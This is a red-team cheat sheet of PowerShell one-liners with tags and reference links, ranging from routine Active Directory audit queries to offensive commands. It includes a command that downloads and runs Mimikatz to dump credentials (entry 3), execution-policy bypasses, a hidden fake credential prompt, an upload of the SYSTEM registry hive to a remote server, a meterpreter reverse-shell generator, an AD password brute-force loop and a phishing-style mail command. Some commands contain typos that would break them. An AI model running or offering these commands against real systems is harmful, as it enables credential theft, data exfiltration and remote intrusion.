### 1. powershell bypass block
```
Set-ExecutionPolicy unrestricted
```
**- Windows,powershell**
#### References:

https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
__________
### 2. powershell bypass block
```
powershell.exe -noprofile -executionpolicy bypass
```
**- Windows,powershell**
#### References:

https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
__________
### 3. Invoke mimicatz, can use with psexec for pwnage
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
```
**- passwords,Windows,av evasion,powershell**
#### References:

http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
__________
### 4. Powershell password last changed, run on DC
```
Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://yg.ht
https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 5. powershell wget
```
invoke-webrequest
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 6. also powershell wget
```
wget
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 7. also powershell wget
```
(new-object system.net.webclient).downloadFile("[url]","[dest]")
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 8. powershell type file
```
get-content
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-content
__________
### 9. powershell services
```
get-service
```
**- Windows,powershell,process management**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-service
__________
### 10. list of drives : cd Env:\ . . . mind . . . blown
```
get-psdrive
```
**- enumeration,interesting,Windows,configuration,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-psdrive
__________
### 11. RTFM *cough*
```
get-help
```
**- Windows,powershell**
#### References:

https://technet.microsoft.com/en-us/library/ee176848.aspx
__________
### 12. list interfaces with wmi
```
get-wmiobject -list 'netework'
```
**- Windows,powershell**
#### References:

https://technet.microsoft.com/en-us/library/ee176860.aspx
https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-wmiobject
__________
### 13. get dns addr tab after :: for more choices
```
[Net.DNS]::GetHostEntry("ip")
```
**- dns,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/ms143998(v=vs.110).aspx
__________
### 14. get system information
```
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
```
**- enumeration,Windows,powershell**
#### References:

http://www.energizedtech.com/2010/03/powershell-check-your-windows.html
__________
### 15. powershell mount remote share : think sysinternals remote share
```
New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
```
**- files,smb,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/new-psdrive
__________
### 16. txt files changed after the 13 Jan 2017
```
Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2017-01-13"}
```
**- files,Windows,powershell,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 17. powershell port scanning
```
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
```
**- networking,loop,interesting,scanning,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 18. Ping ip with timeout of 500
```
$ping = New-Object System.Net.Networkinformation.ping;$ping.Send("[ip]",50O);
```
**- networking,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 19. Ask user for credentials
```
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("[title]","[message]","[user]","[domain]")
```
**- passwords,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 20. powershell run on schedule, match says when run
```
powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden "[exe]";Start-Sleep -s 14400}}while(1)"
```
**- Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 21. Powershell send an email
```
powershell.exe Send-MailMessage -to "[victim]" -from "[from]" -subject "[subject]" -a "[Attach file path]" -body "[Body]" -SmtpServer [ServerIP]
```
**- interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 22. list hostname and ip for domain pc's
```
Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter "domainname='[domain]' | select textrepresentation
```
**- enumeration,dns,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 23. Powershell upload file VIA post, script must write this out
```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
```
**- networking,files,interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 24. powershell shell
```
msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1
```
**- metasploit,av evasion,powershell**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 25. Simple powershell brute force, user input list, checks the password 'password'
```
Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
```
**- loop,brute,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry(v=vs.110).aspx
http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-with-password-reset
__________
### 26. Check for accounts that don't have password expiry set
```
Get-ADUser -Filter 'useraccountcontrol -band 65536' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 27. Check for accounts that have no password requirement
```
Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 28. Accounts that have the password stored in a reversibly encrypted format
```
Get-ADUser -Filter 'useraccountcontrol -band 128' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 29. List users that are trusted for Kerberos delegation
```
Get-ADUser -Filter 'useraccountcontrol -band 524288' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more
https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/
http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/
__________
### 30. List accounts that don't require pre-authentication
```
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 31. List accounts that have credentials encrypted with DES
```
Get-ADUser -Filter 'useraccountcontrol -band 2097152' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
